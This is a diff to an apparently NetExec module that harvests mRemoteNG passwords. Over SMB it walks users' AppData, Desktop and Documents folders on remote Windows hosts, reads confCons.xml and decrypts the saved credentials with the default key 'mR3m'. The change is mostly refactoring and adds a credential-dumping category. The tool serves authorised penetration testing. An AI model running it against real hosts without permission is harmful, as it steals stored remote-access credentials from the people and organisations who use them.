@@ -1,11 +1,12 @@
 import ntpath
-from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 from Cryptodome.Cipher import AES
 from lxml import objectify
 from base64 import b64decode
 import hashlib
 from dataclasses import dataclass
+from nxc.helpers.misc import CATEGORY
+from nxc.protocols.smb.dpapi import upgrade_to_dploot_connection
 
 
 @dataclass
@@ -14,6 +15,7 @@ class MRemoteNgEncryptionAttributes:
     block_cipher_mode: str
     encryption_engine: str
     full_file_encryption: bool
+
 
 class NXCModule:
     """
@@ -24,8 +26,7 @@ class NXCModule:
     name = "mremoteng"
     description = "Dump mRemoteNG Passwords in AppData and in Desktop / Documents folders (digging recursively in them) "
     supported_protocols = ["smb"]
-    opsec_safe = True 
-    multiple_hosts = True
+    category = CATEGORY.CREDENTIAL_DUMPING
 
     def __init__(self, context=None, module_options=None):
         self.false_positive = (
@@ -42,7 +43,7 @@ class NXCModule:
             "Users\\{username}\\AppData\\Local\\mRemoteNG",
             "Users\\{username}\\AppData\\Roaming\\mRemoteNG",
             ]
-        
+
         self.custom_user_path = [
             "Users\\{username}\\Desktop",
             "Users\\{username}\\Documents",
@@ -57,7 +58,7 @@ class NXCModule:
         CUSTOM_PATH     Custom path to confCons.xml file
         """
         self.context = context
-        
+
         self.password = "mR3m"
         if "PASSWORD" in module_options:
             self.password = module_options["PASSWORD"]
@@ -94,7 +95,10 @@ class NXCModule:
             use_kcache=use_kcache,
         )
 
-        dploot_conn = self.upgrade_connection(target=target, connection=connection.conn)
+        dploot_conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
+        if dploot_conn is None:
+            context.log.debug("Could not upgrade connection")
+            return
 
         # 2. Dump users list
         users = self.get_users(dploot_conn)
@@ -117,14 +121,6 @@ class NXCModule:
                 self.context.log.info(f"Found confCons.xml file: {self.custom_path}")
                 self.handle_confCons_file(content)
 
-    def upgrade_connection(self, target: Target, connection=None):
-        conn = DPLootSMBConnection(target)
-        if connection is not None:
-            conn.smb_session = connection
-        else:
-            conn.connect()
-        return conn
-    
     def get_users(self, conn):
         users = []
 
@@ -135,7 +131,7 @@ class NXCModule:
             if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                 users.append(d.get_longname())  # noqa: PERF401, ignoring for readability
         return users
-    
+
     def handle_confCons_file(self, file_content):
         main = objectify.fromstring(file_content)
         encryption_attributes = MRemoteNgEncryptionAttributes(
@@ -144,7 +140,7 @@ class NXCModule:
             encryption_engine=main.attrib["EncryptionEngine"],
             full_file_encryption=bool(main.attrib["FullFileEncryption"]),
         )
-        
+
         for node_attribute in self.parse_xml_nodes(main):
             password = self.extract_remoteng_passwords(node_attribute["Password"], encryption_attributes)
             if password == b"":
@@ -155,7 +151,7 @@ class NXCModule:
             username = node_attribute["Username"]
             protocol = node_attribute["Protocol"]
             port = node_attribute["Port"]
-            host = f" {protocol}://{hostname}:{port}" if node_attribute["Hostname"] != "" else " " 
+            host = f" {protocol}://{hostname}:{port}" if node_attribute["Hostname"] != "" else " "
             self.context.log.highlight(f"{name}:{host} - {domain}\\{username}:{password}")
 
     def parse_xml_nodes(self, main):
@@ -168,7 +164,7 @@ class NXCModule:
                 nodes.append(node.attrib)
                 nodes = nodes + self.parse_xml_nodes(node)
         return nodes
-    
+
     def dig_confCons_in_files(self, conn, directory_path, recurse_level=0, recurse_max=10):
         directory_list = conn.remote_list_dir(self.share, directory_path)
         if directory_list is not None:
@@ -184,7 +180,6 @@ class NXCModule:
                             self.context.log.info(f"Found confCons.xml file: {new_path}")
                             content = conn.readFile(self.context.share, new_path)
                             self.handle_confCons_file(content)
-                            
 
     def extract_remoteng_passwords(self, encrypted_password, encryption_attributes: MRemoteNgEncryptionAttributes):
         encrypted_password = b64decode(encrypted_password)
